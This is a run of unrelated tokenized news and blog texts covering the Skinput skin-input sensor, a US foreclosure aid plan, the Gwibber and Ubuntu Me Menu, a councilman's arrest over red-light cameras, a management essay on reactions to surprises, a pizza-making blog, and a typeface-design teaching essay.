Early trials show that after a short amount of training the sensor / software system can pick up a five - location system with accuracy in excess of 95 % .
Accuracy does drop when 10 or more locations are used , said Mr Harrison , but having 10 means being able to dial numbers and use the text prediction system that comes as standard on many mobile phones .
The prototype developed by the research team sees the sensors enclosed in a bulky cuff .
However , said Mr Harrison , it would be easy to scale them down and put them in a gadget little bigger than a wrist watch .
Mr Harrison said he envisages the device being used in three distinct ways .
The sensors could be coupled with Bluetooth to control a gadget , such as a mobile phone , in a pocket .
It could be used to control a music player strapped to the upper arm .
Finally , he said , the sensors could work with a pico - projector that uses the forearm or hand as a display surface .
This could show buttons , a hierarchical menu , a number pad or a small screen .
Skinput can even be used to play games such as Tetris by tapping on fingers to rotate blocks .
Mr Harrison would not be drawn on how long it might take Skinput to get from the lab to a commercial product .
" But , " he said , " in the future your hand could be your iPhone and your handset could be watch - sized on your wrist . "

WASHINGTON ( Reuters ) - The Obama administration on Friday announced a $ 14 billion effort to try to stem a rising tide of home foreclosures by giving lenders incentives to erase some mortgage debt and slash mortgage payments for the unemployed .
The new aid programs , funded from the $ 50 billion allocated to housing rescue under the Treasury Department ’s Troubled Asset Relief Program , will also allow borrowers to erase mortgage debt down to a maximum of 115 percent of their home ’s value by refinancing through the Federal Housing Administration .
The plan comes as President Barack Obama is under increasing political pressure to change his strategy for helping struggling homeowners and stem the tide of rising foreclosures and is the second major housing initiative announced in as many months .
Delinquencies on U.S. mortgages rose to nearly 14 percent in late 2009 , led by a sharp increase in seriously overdue home loans held by the most credit - worthy borrowers , U.S. banking regulators said earlier on Thursday .
The new measures are a shift from the efforts announced last year , which focused on reducing interest rates for struggling borrowers who got risky loans .
The latest efforts are targeting unemployed workers and homeowners in places where home values have plunged across the board and it is increasingly making more financial sense for homeowners to walk away from their mortgage .
The plan announced in 2009 , known as the Home Affordable Modification Program , has more than a million borrowers who have had their payments temporarily reduced but only around 170,000 borrowers who have received permanent modifications .
That ratio has drawn sharp criticism from both Democrats and Republicans on Capitol Hill , as well as a sharp rebuke from the watchdog overseeing the $ 700 billion bailout .
Ohio Democratic Representative Dennis Kucinich who sided with Obama on this week ’s landmark healthcare legislation , told the administration official responsible for overseeing the bailout on Thursday he had not seen any “ bold , new ” initiatives for underwater borrowers .
“ What are we doing to help those people who owe more on their homes than the home is worth ? ” Kucinich asked .
The new efforts include at least three and at most six months of temporary assistance for jobless workers and incentives for mortgage servicers to write down part of the principal balance .
Recognizing the difficulties for so - called loan servicers to modify loans for unemployed workers , the administration ’s plan aims for lenders to cut payments on existing loans to 31 percent of a borrowers income .
The principal reduction plan would be administered under HAMP and is modeled after a principal reduction plan announced this week by Bank of America .
Under pressure from Massachusetts Attorney General Martha Coakley , Bank of America Corp said on Wednesday it would offer what could be up to $ 3 billion in loan forgiveness to about 45,000 troubled homeowners .

Canonical , the company behind the Ubuntu Linux distribution , is planning to overhaul the desktop panel and integrate social networking features in Ubuntu 10.04 , codenamed Lucid Lynx .
One of the key components of this effort is the Me Menu , which shipped in the Lucid alpha 3 last week .
The Me Menu , which Canonical unveiled in December , provides a unified interface for managing your presence on instant messaging and social networking services .
A text box that is embedded in the menu allows users to publish status messages to all of their accounts .
The menu also provides easy access to the standard account and identity configuration tools .
The Me Menu expands on the concept of Ubuntu 's existing presence menu , which was included in the panel session applet in Ubuntu 9.04 .
Like the original presence menu , the new Me Menu is designed to work with GNOME 's Empathy instant messaging client .
When you post a status message in the menu , it will be propagated to all of your Empathy accounts .
The social networking functionality in the new Me Menu is powered by Gwibber , my open source microblogging client .
I originally created Gwibber in 2007 with the goal of producing a multi-service social networking application for the GNOME desktop environment .
I wanted to be able to communicate seamlessly with multiple social networking services and view all of the content in a combined stream .
The project is now relatively mature and has tens of thousands of users .
Gwibber was initially proposed for inclusion in Ubuntu last year when Canonical authored its " Social by Default " blueprint .
It is included in Ubuntu 10.04 alpha 3 , and brings support for Twitter , Identi.ca , Facebook , FriendFeed , Flickr , Digg , and Qaiku .
The new version of Gwibber is significantly more functional and robust .
I 've spent virtually all of my spare time fixing bugs and adding new features for the next release .
One of the most significant enhancements is the multicolumn mode , which can display a series of streams horizontally in columns .
Another major improvement is extensive support for Desktop CouchDB , which will enable users to synchronize their Gwibber accounts and configuration data between computers .
I improved Gwibber 's user interface by adding a new compact mode for the navigation sidebar and a new toolbar at the bottom of the window that can be used to toggle the active accounts .
I also added a new message style based on the Renkoo theme for Adium , which will be used by default in Empathy on Ubuntu 10.04 .
Although Gwibber has come a very long way over the past six months , it 's still missing some important features that will need to be added to make it competitive with the best proprietary microblogging tools .
I 'm currently working on adding OAuth compatibility , support for Twitter lists , and experimental nickname autocompletion .
Those three features are still under development and will not be included in Gwibber for Ubuntu 10.04 .
I 'm also planning to add support for Google 's Buzz service when its APIs are enabled .
Gwibber 's biggest weakness is the large memory footprint of the frontend and its relatively slow startup performance .
The high memory overhead is caused by WebKit 's in - memory caching , which we will fortunately be able to control better in future versions .
The performance problems in Gwibber 2.29 are largely a side - effect of the program 's dependence on CouchDB .
I 'm exploring some optimization tactics that could help to address the problem .
Gwibber and the Me Menu
In order to fit the Social by Default blueprint , I split Gwibber 's messaging functionality into a separate background daemon that runs independently of the program 's user interface .
The daemon acts as a service that third - party applications can use to communicate with social networks .
It handles all of the heavy lifting and makes it easy for other programs on the desktop to post and consume social networking messages .
When a user posts a message in the Me Menu 's status textbox , the message will be relayed through Gwibber , which will publish it on all of the user 's configured social networking accounts .
The message will also be relayed to Empathy , which will set it as the user 's current status across their instant messaging accounts .
This feature makes it really easy for users to instantly broadcast their thoughts to every corner of their online presence .
I 'm really pleased with the functionality that is offered by the Me Menu , but the implementation still has some weaknesses .
It 's not particularly well - suited for posting long messages due to the constrained space and the lack of an embedded character counter .
These are issues that can be addressed as it matures .
In addition to support for posting status messages and controlling instant messaging presence , the Me Menu also has the ability to launch the account configuration dialogs for Gwibber , Empathy , and Canonical 's Ubuntu One service .
My friend Ken VanDine , who works on Canonical 's desktop team , created a whole new account management tool for Gwibber that is designed to ensure that there is a consistent account management experience between Gwibber and Empathy .
The top of the Me Menu has an identity block that you can click to launch the GNOME desktop 's " About Me " dialog .
The identity block has a slot for the user 's avatar , which will be used by Empathy .
The avatar slot is still just a placeholder and is n't functional yet in alpha 3 .
Ubuntu 10.04 is a Long - Term Support ( LTS ) release , which means that Canonical intends to provide updates on the desktop for three years instead of the usual 18 months .
During the development cycle for an LTS release , the Ubuntu developers focus on stabilization rather than introducing a lot of new features .
Feature freeze is now in full effect , which means that the developers are going to be working primarily on bugfixes between now and the final release in April .
The first beta release will come next month .
You can refer to the official release notes for more details about alpha 3 .
The alpha release is obviously not yet ready for production use , but you can download it for testing purposes from the Ubuntu website .
On 8 July 2010 the ABC published a story titled " Families in the Dark as Adoption Chief Quits " and on 16 March 2010 the ABC published a story titled " Australians Caught in Ethiopian Adoption Nightmare " , which reported on matters concerning the Australian Ethiopian adoption program .
The ABC has received a complaint from Ato Lakew Gebeyehu claiming these publications were defamatory of him .
The ABC would like to make clear that it did not intend to infer that Mr Gebeyehu created false documents or that he otherwise engaged in corrupt or improper conduct or activities detrimental to children in his care or the performance of his functions , and retracts any such inference .
The ABC apologises to Mr Gebeyehu and his family for any distress caused by any readers believing he was personally involved in those matters .
The ABC also acknowledges that problems in the Australian - Ethiopian adoption program were reported by the parents of three Australian families but that other parents involved in the program have reported positive experiences with the program .
The mayor of Duncanville , Texas had a member of the city council arrested last Tuesday for speaking out against the use of red light cameras during an official meeting .
The incident took place during the discussion of whether the city should spend $ 59,000 to make street repairs .
Mayor David Green recognized Councilman Paul Ford to speak on the contract item .
" Thank you , " Ford said .
" I want to let you know that earlier this evening during briefing , Mayor Green threatened me that if he told me to stop talking and I did n't , he'd have me arrested , and I want to let you know what I told Mayor Green . "
Green became outraged and shouted , " Mr Ford , you are out of order .
You are not recognized Mr Ford .
You need to cease right now . "
While Green yelled , Ford continued his brief statement without stopping .
" Unlike those thousands of people who are getting red light camera tickets , I will have the opportunity for a jury trial .
It will be a jury of my peers and I will confidently put my fate in their hands .
And now I 'm going to discuss agenda item number three .
I will vote against it , and here 's why . "
Before he had a chance to explain that the city could find the money for those necessary street repairs by cutting the city manager 's salary from $ 179,000 to $ 160,000 and reducing payments to local chambers of commerce by $ 40,000 , Police Chief Robert Brown grabbed Ford .
Ford repeated several times the statement : " Chief Brown , I will not leave voluntarily , but if you believe I am violating the law by discussing this agenda item , I will submit to arrest . "
Brown did not respond .
Mayor Green had the audio of the city council video tape turned off as Brown dragged the councilman out of the chamber .
Ford ended up hospitalized from injuries sustained during the arrest .
Ford 's comments referenced an earlier , private briefing of city council members where the mayor complained that Ford had attempted to " take control " of past meetings .
To stop this , Green announced that he would instruct the city manager to remove any council member who disrupted a meeting .
Over the past few council sessions , Ford raised the mayor 's ire by insisting that the city code be amended to allow motorists the option of a jury trial when contesting red light camera citations and by his pointing out that only five percent of the 43,955 red light camera tickets issued in the city went to motorists accused of the straight - through violations most consider to be " red light running . "
" I 'm not the one who brought the red light camera scandal to Duncanville , " Ford responded at the private meeting .
" I 'm the one who brought it to light , but I 'm not the one who imposed it on us ...
I recognize that there probably is no city employee in this room who will stand up to you guys ...
Unlike those people who are getting red light camera citations , I will have an opportunity for a jury trial when you arrest me for whatever it is that you 've discussed , whether it 's disrupting a public meeting or disorderly conduct .
I will have a jury trial , and it will be a jury of my peers , not yours .
In other words , people who are not getting money from this city .
And I will with conscience place my fate in their hands . "
Mayor Green 's expulsion of an elected member of the city council violated standard rules of procedure .
Under Robert 's Rules of Order , the binding code of conduct for most municipal organizations , Green would not have any authority to have Ford removed for making off - topic comments that lasted less than thirty seconds .
The use of force to remove a member is considered an extreme measure and a last resort .
" Although the chair has no authority to impose a penalty or to order an offending member removed from the hall , the assembly has that power , " the Rules state .
Under this set of procedures , a mayor would first have issued a warning to an unruly member and , if ignored , put the question of what to do about it to the entire city council .
A majority vote would be required to have a sitting member removed from the chambers after that member is given an opportunity to speak in his own defense .
Under Duncanville 's city charter ( 2.15 ) , only the full council can change the rules of procedure , not the mayor acting alone .
Ford has been released from the hospital but the mayor had a warrant issued for his arrest .
Ford announced yesterday his intention to turn himself in .
Since March , Ford has attempted to gather 1300 signatures to create a referendum on the red light camera program in Duncanville .

FRED MORRISON , a pilot and carpenter credited with inventing that most ubiquitous of backyard toys , the frisbee , has died at his home in Monroe , Utah , aged 90 .
The inspiration for Morrison ’s flying - saucer toy came when he and his girlfriend were entertaining themselves by tossing a popcorn - tin lid in the backyard .
The lid eventually became dented , and a cake pan from Morrison ’s mother ’s kitchen was substituted .
One day when the couple were playing on the beach , a stranger offered them a quarter for the device .
“ That got the wheels turning , ” Morrison told a reporter in 2007 .
It ’s a Gaelic word that means storyteller .
And from 2005 - 2007 it was one of the first and best podcasts .
It was featured in the Apple Music Store , on NPR and in “ Podcasting for Dummies ” and “ Secrets of the Podcasting Masters . ”
But podcasting is a relentless grind , and nothing lasts for ever , so Patrick moved on .
Since then , he ’s written seven books , helped a bunch of people write better and done a lot of work helping a lot of people with their content .

There was a fight on the roller hockey rink this morning .
Anaheim bumped into Philadelphia at speed and Philly did n’t like that so he elbowed Anaheim in the chest — hard .
Anaheim pushed back , shoving Philly into the goal where he tripped and fell .
Swearing , more shoving , and then we spent the next five minutes keeping them separated .
This hockey rink is a remnant of first Internet bubble .
Built by Netscape , the rink has held a game every Saturday since 1996 .
A majority of the folks who show up know each other , so the game is mellow .
Finesse , not fighting .
A fight is an unusual once a year thing .
When Philly , who I believed was at fault for this whole situation , got the bench , someone asked him what happened .
His answer , “ Anaheim ran into me and I protected myself . ”
One Eighth of a Second
I want you to think of the last time you were surprised .
Good , bad , I do n’t care .
When was the last time you were really surprised ?
Got it ?
Ok , now think about the very first thing that you thought about the surprise .
I do n’t want to know how you eventually handled it ; I want you to think about your instantaneous first reaction .
How do you react when you ’re surprised ?
Is this how you always react when a surprise lands ?
My guess is yes .
On the hockey rink , Philadelphia puts up his shields when he ’s surprised .
It ’s a natural reaction , protecting yourself , but what ’s interesting is n’t Philly ’s very sensible reaction to the perception of being attacked , it ’s everyone else ’s interpretation .
We all saw him hold up his arms in defense of Anaheim ’s unintentional attack and we all thought , “ Man , Philly .
What a goon . ”
In any group of people larger than one , these instantaneous reactions to unexpected situations happen a lot , and understanding their range and impact is important to navigating awkward , tension - filled , and professionally tricky situations .
The Jerks
These are knee jerk reactions , and the first thing you need to know about them is that they should be first viewed without judgement .
I ’m not a psychologist and I do n’t know why some people are aggressive knee jerkers and others are passive .
I do n’t know if these reactions are a function of upbringing or genetics , but I do know that we as a species have little control over these initial reactions and there are many of them .
In my head , the complete set of reactions fit on a spectrum that is labeled Fight or Flight .
The first step in understanding a knee jerk reaction is first figuring out where on this spectrum the reaction lies .
Is this a person who is going to take on the surprise or are they going to let it wash over them ?
Will they bolt ?
Will they wilt ?
If there is one thing you want to know quickly about those around you , it ’s their penchant to fight the surprise or flee it .
Again , no judgement .
A person who automatically has the fight instinct is not necessarily a jerk — it ’s just the default instinct when the world unexpectedly and rapidly changes .
I know who on my team will attack a surprise .
They ’ll leap on it .
I also know the ones who will silently digest the surprise .
I know who is going to come back three hours or three days later with a totally different attitude because they ’ll have actually processed the surprise .
The base assessment of fight or flight gives you a starting point regarding what might first happen when a surprise lands , but there are other instantaneous reactions that occur and understanding them gives you an idea of what you need to do next , if anything .
For the sake of this article , my assumption is a surprise has landed and it ’s bad news .
These reactions apply regardless of the type of surprise , but let ’s assume it ’s professionally bad news with negative consequences and it ’s being delivered in a group setting .
Here ’s whom you might see across the table :
Dr. No. Denial .
That ’s the reaction .
Does n’t matter if the surprise is reasonable , understandable , or well explained .
Dr. No ’s only reaction is a fighting “ No ” .
“ No , I ’m not going let her go . ”
“ No , I ’m not moving organizations . ”
“ No , we ’re not shutting down this group . ”
Remember , knee jerk reactions are not rational , they are not considered , and while they are tactically interesting , they are not strategically useful .
Dr. No ’s denial is not her actual thoughts on that topic , it ’s her reptilian brain reaction to a surprise .
No .
If this is a group surprise and Dr. No is sitting in a conference room full of people throwing down the No , there ’s a chance for everyone to go off the rails .
Well , Dr. No said no and I agree , so NO AS WELL .
The time immediately after the surprise goes down is not the time to take any action except to allow folks to react .
There are going to be Nos as well as a bevy of other reactions and your job , if it ’s your meeting , is to let folks talk — let them react .
The goal with Dr. No and everyone else in the room is to get their reaction out so that we can figure out what to do next .
The follow - up : The good news is that Dr. No has got it out of her system .
She ’s expressed her displeasure , which is half of the game .
The next time you chat , there will be residual No , but Dr. No knows that she ’s been heard and will be willing to brainstorm what to do next about the surprise .
Raging Bull .
Perhaps the most dangerous of the reactions , Raging Bull wants to fight .
They ’re taking the surprise personally , they ’re going to say No , and they ’re going to pick a fight .
The Raging Bull is Dr. No with attitude .
The move with the Raging Bull is to know that it ’s coming , to know that you ’ve got a Raging Bull on your hands .
If you have any control over the surprise , you want to put the Raging Bull in a safe situation where they can react to their heart ’s content without afflicting psychological damage on others or sparking a mob mentality where they infect a mindless horde of mini-Raging Bulls .
If it ’s a pure surprise and it ’s a group setting , my advice is to end the meeting as quickly as possible .
Like Dr. No , Raging Bull is expressing his shock .
Unlike Dr. No , the Raging Bull is n’t going to feel complete until they ’ve got the emotional satisfaction of picking a fight with someone else .
The follow - up : Everyone needs time to contemplate a surprise , but no one needs time more than Raging Bull .
Each knee jerk reaction scratches a particular psychological itch and in the case of Raging Bull , they believe that getting someone else to participate in their mental and verbal freak - out is somehow going to help .
It ’s not .
Of all the reactions , Raging Bull ’s behavior is the one that I ’ve found to likely to repeat itself after the fact .
Raging Bull will often continue to pick fights days after the initial surprise , which is why it ’s your move to get them thinking , as quickly as possible , about what ’s next .
What are we going to do about the surprise ?
What specific thought does Raging Bull have which is crucial to successfully navigating this surprise ?
Still Water .
This reaction reads like flight because they ’re not fighting .
In fact , they ’re just sitting there , but Sill Water is taking it all in .
They ’re not missing a thing and in their complete silence , wearing their poker face , they are meticulously processing , they ’re evaluating all possible permutations , best and worst case scenarios , and potential impact on their day to day .
This processing results in one of two very different Still Waters .
There ’s the true Still Water who is going to maintain the calm demeanor for the entire duration of the surprise .
See , this Still Water ’s processing has resulted in a comfortable plan .
They believe they know what to do about the surprise and this realization has brought them peace .
The second Still Water is mentally losing their shit .
Sure , externally they look calm , but internally their processing has resulted in increasingly loony nightmare scenarios regarding the surprise .
Without quick action , Insane Still Water will find reason to become a Raging Bull .
The follow - up : You want to get to Still Water as quickly as possible in a safe location after the surprise because Still Water is n’t still .
Unlike Dr. No and the Raging Bull who had their opportunities to weigh in , Still Water is still in their head and the longer they remain in the head , the higher the probability they ’ll tell themselves a tale that will drive them insane .
You need Still Water to say out loud how they feel about the world suddenly changing .
Like Raging Bull , you need to engage Still Water in the surprise and move the problem out of their heads and onto the table where everyone can take action .
Distiller .
This is my favorite knee jerk reaction because the Distiller attacks the surprise with questions .
Why did this happen ?
How come we did n’t see it coming ?
Ok , what ’s the impact ?
Right , what are we going to do ?
This is a fight reaction , but a constructive one .
The Distiller is as uncomfortable as anyone with the surprise , but their coping mechanism is aggressive understanding .
They ’re not going to stop asking questions until they feel they ’ve got a complete understanding of what actually happened .
In a group setting , I let the Distiller have free - reign during the landing of the surprise because their incessant questions are helping everyone in the room contemplate what actually happened .
They focus the surprise on facts rather than feel .
The follow - up :
You ’re going to feel you ’ve got a good idea where the Distiller is at because of their endless questions , but now ’s a good time to explain that everyone comes down from a surprise in different ways , which is why everyone needs that personal follow - up .
Yeah , a Distiller can turn into Raging Bull after a night ’s sleep .
Still Water might go Distiller .
You just do n’t know who is going to walk into the building 24 hours after the surprise .
This is why most surprises are engineered to occur late in the week ; there ’s a belief that all the knee jerks are going to calm down over the weekend .
Maybe .
More on this in a bit .
The Handler .
The first flight reaction sure does n’t feel like flight .
The Handler is not surprised .
In fact , they ’re fired up to handle whatever the surprise might be .
They make it appear that they knew this surprise was going to occur .
How ’d they do that ?
The Handler is a calm facade .
Where the Distiller understands via questions , The Handler ’s coping mechanism is the illusion they ’ve got it all figured out — that they ’re 10 steps ahead of everyone else .
This is a convenient reaction when you ’ve got the Raging Bull standing on the conference table challenging anyone to hand - to - hand combat , but The Handler needs help .
The follow - up : The Handler crumbles hardest .
The Handler is actually Dr. No except without the denial .
There will be a quiet moment in the middle of the night when The Handler realizes absolutely nothing has been handled and then you ’ll see their actual reaction .
My Bad .
This flight reaction is one of accountability .
My Bad ’s impression is that they ’ve personally done something to incur this particular surprise .
They believe that if only they had done just one thing different , no one would ’ve had to deal with the surprise .
There ’s hope inside of My Bad ’s reaction .
Their empathy regarding the surprise is constructive , as opposed to the destructive social tendencies of Dr. No or Raging Bull , but you do n’t want them wallowing in their overdeveloped sense of accountability .
The follow - up : My Bad is not responsible for the surprise .
While their sense of responsibility is admirable , My Bad needs to understand the actual cause behind the surprise .
They did n’t cause it , so they should n’t feel it .
They more they focus on feeling responsible , the less energy and focus they have for making progress .
We ’re Doomed .
The most common flight reaction is also the reaction that , I believe , everyone is going to experience as they digest the surprise .
Despair .
In a room full of geeks hearing a surprise for the first time , one of their first thoughts is , “ How does this surprise fit into my mental system of how things work ? ”
Failure to map the surprise into the mental model results in an uncomfortable realization : “ The world does not work as I expected .
Therefore , other surprises are guaranteed to happen randomly .
QED .
I have no control whatsoever .
Shit . ”
The follow - up : A perceived lack of control or understanding of our world is a confidence shattering experience for the geek , and the best way to attack this despair is with a project .
Does n’t matter if the project is surprise - related or not , the geek needs something to do .
They need the blissful distraction of building something .
It ’s during this constructive distraction that they ’ll actually figure out how they feel about the surprise .
I Quit .
The last knee jerk is our strongest flight reaction .
An extreme version of We ’re Doomed , I Quit does exactly what you ’d expect : they threaten to quit on the spot .
They ’re not quitting .
Well , they might , but not right now .
You need to translate “ I quit ” into what they ’re actually saying : “ I am very surprised and I do n’t like being this surprised . ”
It ’s unfortunate that this is their reaction , especially in a group setting , because I Quit ’s attitude can create mass professional hysteria , which means this needs to be handled immediately .
You ca n’t wait until after the weekend to explain to I Quit that their reaction at this moment might be vastly different after a night ’s sleep .
You need to hold up a mirror in front of them and ask , “ No matter the surprise , why in the world would you eliminate so many options by quitting on the spot ? ”
The follow - up : I Quit will calm down and land on another opinion , but their knee jerk reaction is a sign of a larger problem .
I do n’t know what your surprise is , but I know if someone wants to quit that , first , it ’s a big surprise , and second , they value their job second to their peace of mind .
Stages of Jerk
With people , it ’s never as easy as just a name .
These labels for the knee jerk reactions are deliberately simple , but people are conspicuously complex .
As I hinted earlier , I ’ve found it commonplace that you ’re going to see multiple knee jerk reactions as a corporate surprise is comprehended .
These reactions , like grief , have stages , and your job as a manager or a concerned co-worker is actually not comparably complex .
Your job is to listen .
The reason there ’s a knee jerk reaction is because the unexpected occurred .
It kicks off the process of assimilation and that ’s what we care about — the understanding of the surprise , not the reaction to it .
While everyone has a different reaction , they ’re all going to end up trying to figure out what just happened , and part of that process is having someone they trust sit there and listen to their assessment .
Verbally walking through our thoughts is one of the ways we organize and understand them and begin the process of finding a comfortable constructive conclusion .
I ’m just as uncomfortable with a Raging Bull as anyone , but I know this knee jerk reaction is not who they are , this is just how they react .
Understanding these varied potential reactions is just the first part of digesting a surprise – it helps you understand what to expect so you can begin to figure out what to do next .
2 terracotta tiles : $ 2.16
2 balls of pizza dough : $ 5.18
1 jar of tomato sauce : $ 1.89
1 ball of fresh mozzerella : $ 3.99
making your own pizza at home : fuck yeah
( makes about four servings for around $ 10 )
Okay , I cheated a little by buying premade dough and using jarred tomato sauce but this was mostly to test out the technique of using a terracotta tile setup and broiling the pizza .
A lot of people use pizza stones that cost upwards to a hundred dollars , but you can get a nice 12in x 12in terracotta tile from a hardware store and it ’ll do the trick .
So the point of using a pizza stone , usually clay or ceramic , is so that it distributes heat evenly , retains heat , and the porous structure absorbs moisture resulting in a crispier crust .
I was trying to duplicate NY style brick oven pizza with nice charring on the bottom and a crisp thin crust .
In order to achieve that you need a hot - as - fuck oven ( over 800 C ) that only wood fired coal ovens can achieve .
So how do you do this at home ?
Well , one guy on the internet actually broke the safety latch on his oven and used the self cleaning cycle to get it super hot .
I do n’t think I can do that , so I did the next best thing .
Using the terracotta tiles and getting my oven as hot as I could .
I put one on the top rack 1.5 in away from the broiler and another in the middle rack and turned the broiler on and let the oven heat for half an hour .
The rack set up was n’t intentional .
I wanted to get both tiles on the top rack close to the broiler but both would n’t fit .
I made a total of 5 pies .
First two I got 2 pies from 1 dough ball about 12in in size and I found that the dough was too thick .
Nice and chewy inside toasty outside .
A good pie but not what I was looking for .
The next 3 I made were from one doughball and that was a good thickness .
I tried to stretch them out but ended up using a rolling pin .
I ’m not as daring to toss the pizza…yet .
You can see on the right the first ones I made where they were thicker and on the left are the ones I later made that were a bit thinner .
I experimented with the distance of the tiles from the broiler , cooking time , and a few other things .
So here ’s one of the pies on a makeshift pizza peel ( cutting board ) .
I got it nice and thin and then threw some flour on top .
Flipped it over and brushed a little olive oil on the top .
Also I learned that you need to use a fork and poke some holes in the pizza otherwise the dough will poof up ( the steam has to go somewhere ) .
Then I slid it on the tile in the middle of the oven .
I am a MacGyver in the kitchen .
After about a minute , when the outside is cooked , I take it out and then put about 1 TBSP of sauce then some mozzarella .
Put it back in until the cheese is bubbly and the outside is slightly charred .
What it looks like after taking it out :

Back in the oven on the top rack :

Overall , the pizzas were delicious .
Anything fresh out of the oven will be delicious .
However , I would ’ve liked more charring .
I ’m still going to play around with the broiler and tile setup to get the most heat out of the tiles and good charring without burning the pizza .
Next time I might even try my own sauce and pizza dough .
I think it would also be good to put the tomato sauce and cheese right on the raw dough and just leaving it on the top rack the entire time to get some more color out of the cheese .
The problem with that is the bottom wo n’t get as crisp as I want .
Teaching on a postgraduate course feels very much like a spiral : the annual repetition of projects , each a vehicle for a journey of education and discovery for the student , blurs into cyclical clouds of shapes , paragraphs , and personalities .
There seems to be little opportunity for reflection across student cohorts , and yet it is only this process that improves the process from one year to the next .
Having passed the tenth anniversary of the MA Typeface Design programme was as good an opportunity as any to reflect , and ILT ’s offer to publish the result an ideal environment to get some ideas out in the open .
Although my perspective is unavoidably linked to the course at Reading , I think that the points I make have wider relevance .
Our students , both young and mature , often find themselves for the first time in an environment where research and rigorous discussion inform design practice .
The strong focus on identifying user needs and designing within a rigorous methodology is often at odds with past experiences of design as a self - expressive enterprise : in other words , design with both feet on the ground , in response to real - world briefs .
In addition , students are expected to immerse themselves in the literature of the field , and , as much as possible , contribute to the emerging discourse .
( There are many more books and articles on typeface design than people generally think ; some are not worth the paper they ’re printed on , but some are real gems . )
I should n’t need to argue that research , experimentation , and reflection on the design process lead not only to better designs , but better designers .
In recent years , two significant factors have started influencing attitudes to design .
Firstly , as generations grow up using computers from primary school onwards , it is more difficult to identify the influence of the computer as a tool for making design decisions , rather than implementing specifications .
Secondly , the trend in higher education to restructure courses as collections of discrete modules results in a compartmentalisation of students ’ skills and knowledge : it is becoming more difficult for the experience in one class to have an impact on the work done in another .
( A third , less ubiquitous , factor would be the diminishing importance of manual skills in rendering and form - making in design Foundation and BA / BFA courses , a subject worthy of discussion in itself . )
So , repeating the caveat that these observations are strictly personal , I offer them in the hope they will prove interesting at least to the people setting up and running new courses in typeface design , and the many designers teaching themselves .
1. Design has memory ( even if many designers do n’t )
Typography and typeface design are essentially founded on a four - way dialogue between the desire for identity and originality within each brief ( “ I want mine to be different , better , more beautiful ” ) , the constraints of the type - making and type - setting technology , the characteristics of the rendering process ( printing or illuminating ) , and the responses to similar conditions given by countless designers already , from centuries ago to this day .
Typographic design never happens in a vacuum .
A recent example is Emigre magazine : can its early period be seen without reference to the sea- change in type - making and typesetting tools of the mid-eighties ?
and is not its middle period a mark of emerging maturity and focusing , critically and selectively , on those conventions worth preserving in a digital domain ?
Emigre is important as a mirror to our responses to new conditions and opportunities , and cannot be fully appreciated just by looking at the issues .
( Especially if you look at scaled - down images , rather than the poster - like original sizes ! ) .
At a more subtle level , the basic pattern of black and white , foreground and background , for “ readable text ” sizes has been pretty stable for centuries , and pretty impervious to stylistic treatments .
Does not a type designer gain by studying how this pattern survives the rendering environments and the differentiation imposed by genre and style ?
And yet , many designers have a very patchy knowledge of the history of typography and letterforms .
More worryingly , students and designers alike have little opportunity to experience genre - defining objects in reality ( imagine discussing a building looking only at the blueprints for building it , not walking up to it , and through its rooms ) .
It is perhaps not surprising that the wide but shallow knowledge gained from online sources is dominant ; there seems also to be little discrimination between sources that employ review and editorial mechanisms , and those that are open to wide , unchecked contributions .
This shallow approach to reading and investigating results in a lack of coherent narratives , not only about how things happened , but also why .
And how were similar design problems addressed under different design and production environments ?
What can artifacts tell us about how people made decisions in similar situations before ?
How did changing conditions give rise to new solutions ?
To paraphrase Goudy , the problem is not any more that the old - timers stole all the best ideas , but that the old ideas are in danger of being re-discovered from scratch .
( Just look at the web designers rediscovering the basic principles of text typography and information design , as if these were newly - found disciplines . )

2. Design is iterative , and improved by dialogue
The process of typeface design is , in essence , a reductive refinement of ever smaller details .
First ideas are just that : sketches that may offer starting points , but have to be followed by a clear methodology of structured changes , reviews , testing – and repetition of the whole process .
The attention of the typeface designer must progress in ever decreasing scales of focus : from paragraph - level values on the overall density of a design , to the fundamental interplay of space and main strokes , to elements within a typeform that ensure consistency and homogeneity , and those that impart individuality and character .
At the heart of this process is dialogue with the brief : what conditions of use are imposed on the new design , and what are the criteria to determine excellence in responding to the brief ?
( For example , how will the end users make value associations with the typeface ? )
The wider the typeface family , the deeper the need to test conclusively , not only with documents that highlight the qualities of the typeface , but also with documents that approximate a wide range of possible uses .
Even in cases of very tight briefs ( as in the case of bespoke typefaces for corporate clients ) , the range of uses can be extremely broad .
But good designers are also aware of the constraints of their testing environment .
The misleading impression of transparency and fidelity that computer applications give , and the limitations of laser - printer output , obstruct trustworthy decisions .
Designers must be aware of how looking at medium resolution printouts in dark toner on highly bleached paper can bias their decisions .
We are also seeing a gradual return to typeface design being a team enterprise , drawing on the expertise of a group rather than an individual .
This , of course , is not new : typeface design in the hot - metal and phototype eras was very much a team product .
But just as the digital , platform - independent formats enabled designers to function outside a heavy engineering world , so it enabled the explosion of character sets and families to unprecedented levels .
The necessary skills and the sheer volume of work required for text typefaces have driven a growth of mid-size foundries , where people with complementary skills collaborate in a single product .
The corollary is a rise in the need for documentation and explanation to a community of fellows .
The short - lived “ creative hermit ” model is giving way to new models of work .

3 . Scale effects are not intuitive
The conventional curriculum for design education rarely tackles scales smaller than a postcard .
More importantly , the compositional aspects of design tend to take precedence over details at the level of the paragraph , let alone the word .
Typeforms for continuous reading are designed at fairly large sizes ( on paper or , more usually , occupying most of a computer screen ) but are experienced in much smaller sizes where their features have cumulative effects , weighted by the frequency with which specific combinations occur .
These conditions arise in every text setting , be it for prose read forty centimetres away , or a sign viewed from a distance of tens of metres .
Of all the skills typeface designers need to develop , understanding how to make shapes at one scale behave a particular way in another scale is the most troublesome one .
Imagining the difference that a small change in a single letter will have in a line or paragraph of typeset text is not an innate skill : it is entirely the result of practice .
The best designers are the ones who will naturally ask “ why does this paragraph look this way ? ” and try to connect the answer to specific design choices .
A common example of problems connected to scale effects arises whenever a student follows a writing tool too closely as a guide for designing typeforms : whereas the ductus ( the movement of the stroke ) and and the modulation can be preserved across scales without much difficulty , the details of stroke endings and joints cannot ; typographic scales demand a sensitivity to optical effects that simply do not apply at writing scales .
The best examples come from typefaces designed for the extremes of text scales : for telephone directories ( famously by Ladislas Mandel and Matthew Carter ) , Agate sizes for listings , and early typefaces for screen rendering .
The smaller the size ( or the coarser the rendering resolution ) , the more the designer primarily separates blobs and bars of white space , and only secondarily deals with style and detail .

4 . Tools are concepts
Regardless of the scale effects mentioned above , there is a requirement to appreciate the link between typeface design and writing , and the tools used for writing .
